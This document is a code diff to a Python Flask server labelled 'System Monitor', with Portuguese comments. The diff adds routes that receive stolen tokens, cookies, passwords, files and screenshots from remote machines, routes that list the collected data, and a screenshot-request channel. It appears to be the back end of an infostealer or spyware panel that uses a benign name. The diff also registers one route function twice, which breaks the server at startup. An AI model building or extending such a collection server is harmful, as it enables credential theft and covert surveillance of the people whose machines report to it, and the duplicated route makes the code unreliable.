@@ -959,6 +959,220 @@ HTML_TEMPLATE = """
 </html>
 """
 
+@app.route('/api/tokens_data')
+def get_tokens_data():
+    """Retorna todos os tokens coletados"""
+    return jsonify(endpoint_tokens)
+
+@app.route('/api/cookies_data')
+def get_cookies_data():
+    """Retorna todos os cookies coletados"""
+    return jsonify(endpoint_cookies)
+
+@app.route('/api/passwords_data')
+def get_passwords_data():
+    """Retorna todas as senhas coletadas"""
+    return jsonify(endpoint_passwords)
+
+@app.route('/api/files_data')
+def get_files_data():
+    """Retorna todos os arquivos recebidos"""
+    return jsonify(endpoint_files)
+
+@app.route('/api/metrics_data')
+def get_metrics_data():
+    """Retorna todas as métricas"""
+    return jsonify(metrics_data)
+
+@app.route('/api/full_reports')
+def get_full_reports():
+    """Retorna todos os relatórios completos"""
+    return jsonify(full_reports)
+
+@app.route('/api/tokens', methods=['POST'])
+def receive_tokens():
+    """Recebe tokens de um endpoint"""
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        tokens = data.get('tokens', [])
+        
+        if endpoint_id:
+            endpoint_tokens[endpoint_id] = {
+                'tokens': tokens,
+                'timestamp': datetime.now().isoformat()
+            }
+            print(f"[API] Tokens recebidos: {endpoint_id} - {len(tokens)} tokens")
+            return jsonify({'status': 'success'})
+    except Exception as e:
+        print(f"[API] Erro ao receber tokens: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/cookies', methods=['POST'])
+def receive_cookies():
+    """Recebe cookies de um endpoint"""
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        cookies = data.get('cookies', [])
+        
+        if endpoint_id:
+            endpoint_cookies[endpoint_id] = {
+                'cookies': cookies,
+                'timestamp': datetime.now().isoformat()
+            }
+            print(f"[API] Cookies recebidos: {endpoint_id} - {len(cookies)} cookies")
+            return jsonify({'status': 'success'})
+    except Exception as e:
+        print(f"[API] Erro ao receber cookies: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/passwords', methods=['POST'])
+def receive_passwords():
+    """Recebe senhas de um endpoint"""
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        passwords = data.get('passwords', [])
+        
+        if endpoint_id:
+            endpoint_passwords[endpoint_id] = {
+                'passwords': passwords,
+                'timestamp': datetime.now().isoformat()
+            }
+            print(f"[API] Senhas recebidas: {endpoint_id} - {len(passwords)} senhas")
+            return jsonify({'status': 'success'})
+    except Exception as e:
+        print(f"[API] Erro ao receber senhas: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/files', methods=['POST'])
+def receive_files():
+    """Recebe arquivos de um endpoint"""
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        files = data.get('files', [])
+        
+        if endpoint_id:
+            endpoint_files[endpoint_id] = {
+                'files': files,
+                'timestamp': datetime.now().isoformat()
+            }
+            print(f"[API] Arquivos recebidos: {endpoint_id} - {len(files)} arquivos")
+            return jsonify({'status': 'success'})
+    except Exception as e:
+        print(f"[API] Erro ao receber arquivos: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/metrics', methods=['POST'])
+def receive_metrics():
+    """Recebe métricas de um endpoint"""
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        metrics = data.get('metrics', {})
+        
+        if endpoint_id:
+            metrics_data.append({
+                'endpoint_id': endpoint_id,
+                'metrics': metrics,
+                'timestamp': datetime.now().isoformat()
+            })
+            print(f"[API] Métricas recebidas: {endpoint_id}")
+            return jsonify({'status': 'success'})
+    except Exception as e:
+        print(f"[API] Erro ao receber métricas: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/full_report', methods=['POST'])
+def receive_full_report():
+    """Recebe relatório completo"""
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        report_data = data.get('report_data', {})
+        
+        if endpoint_id:
+            full_reports[endpoint_id] = {
+                'report_data': report_data,
+                'timestamp': datetime.now().isoformat()
+            }
+            print(f"[API] Relatório completo recebido: {endpoint_id}")
+            return jsonify({'status': 'success'})
+    except Exception as e:
+        print(f"[API] Erro ao receber relatório: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/screenshot_upload', methods=['POST'])
+def receive_screenshot_upload():
+    """Recebe upload de screenshot"""
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        screenshot_data = data.get('screenshot', {})
+        
+        if endpoint_id:
+            endpoint_screenshots[endpoint_id] = {
+                'image': screenshot_data.get('image', ''),
+                'timestamp': datetime.now().isoformat()
+            }
+            print(f"[API] Screenshot recebido: {endpoint_id}")
+            return jsonify({'status': 'success'})
+    except Exception as e:
+        print(f"[API] Erro ao receber screenshot: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/complete_report_upload', methods=['POST'])
+def receive_complete_report_upload():
+    """Recebe upload completo"""
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        complete_data = data.get('complete_data', {})
+        
+        if endpoint_id:
+            # Processa todos os dados do relatório completo
+            print(f"[API] Relatório completo recebido: {endpoint_id}")
+            return jsonify({'status': 'success'})
+    except Exception as e:
+        print(f"[API] Erro ao receber relatório completo: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/request_screenshot/<endpoint_id>', methods=['POST'])
+def request_screenshot(endpoint_id):
+    """Solicita screenshot de um endpoint específico"""
+    try:
+        # Marca que foi solicitado screenshot
+        if endpoint_id not in screenshot_requests:
+            screenshot_requests[endpoint_id] = {
+                'request_screenshot': True,
+                'timestamp': datetime.now().isoformat()
+            }
+        print(f"[API] Screenshot solicitado: {endpoint_id}")
+        return jsonify({'status': 'success', 'message': f'Screenshot solicitado para {endpoint_id}'})
+    except Exception as e:
+        print(f"[API] Erro ao solicitar screenshot: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/screenshot_requests/<endpoint_id>')
+def check_screenshot_request(endpoint_id):
+    """Verifica se há solicitação de screenshot"""
+    if endpoint_id in screenshot_requests:
+        return jsonify(screenshot_requests[endpoint_id])
+    else:
+        return jsonify({'request_screenshot': False})
+
+@app.route('/api/screenshots')
+def get_screenshots():
+    """Retorna todos os screenshots"""
+    return jsonify(endpoint_screenshots)
+
+@app.route('/api/files_data')
+def get_files_data():
+    """Retorna todos os arquivos recebidos"""
+    return jsonify(endpoint_files)
+
 if __name__ == '__main__':
     print("🚀 Iniciando System Monitor ORIGINAL...")
     print("📡 Endpoints disponíveis:")
@@ -977,6 +1191,8 @@ if __name__ == '__main__':
     print("   - GET  /api/cookies_data")
     print("   - GET  /api/passwords_data")
     print("   - GET  /api/screenshots")
+    print("   - GET  /api/files_data")
+    print("   - GET  /api/metrics_data")
     print()
     
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
